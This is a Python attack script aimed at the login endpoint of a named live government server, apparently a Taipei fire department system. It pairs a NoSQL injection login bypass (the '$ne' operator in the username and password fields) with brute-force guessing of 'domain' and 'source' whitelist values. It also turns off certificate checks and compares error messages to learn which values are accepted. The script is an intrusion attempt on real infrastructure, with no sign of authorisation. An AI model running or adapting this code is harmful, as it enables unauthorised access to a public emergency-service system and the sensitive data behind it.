import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body,hdr=None):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    if hdr: s.headers.update(hdr)
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text, dict(r.headers)
    except Exception as e: return None, repr(e), {}

# source 白名单爆破: 用 domain 字段 (之前被忽略, 但试更多值 + 403 消息对比)
print("=== 403 消息是否随 domain/source 变化 (泄露白名单) ===")
src_vals=["PORTAL","WEB","API","SYSTEM","TPF","AUTH","ADMIN","CONSOLE","DASHBOARD","MOBILE",
  "PC","WEB_PORTAL","AUTH_SERVER","MAIN","DEFAULT","TPF_PORT","DISPATCH","EMERGENCY","119","999",
  "port","web","api","system","tpf","auth","admin","default","main"]
seen={}
for sv in src_vals:
    b={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":sv}
    code,t,h=login(b)
    key=(code,t[:60])
    if key not in seen:
        seen[key]=sv
        print(f"  domain={sv:14s} -> {code} | {t[:55]}")
    time.sleep(0.05)
print(f"\n不同响应数: {len(seen)} (若>1 说明 domain 影响 source 校验)")

# 也试 source 字段
print("\n=== source 字段爆破 ===")
seen2={}
for sv in src_vals:
    b={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER","source":sv}
    code,t,h=login(b)
    key=(code,t[:60])
    if key not in seen2:
        seen2[key]=(sv,t[:55])
        print(f"  source={sv:14s} -> {code} | {t[:55]}")
    time.sleep(0.05)
print(f"不同响应数: {len(seen2)}")
print("DONE")
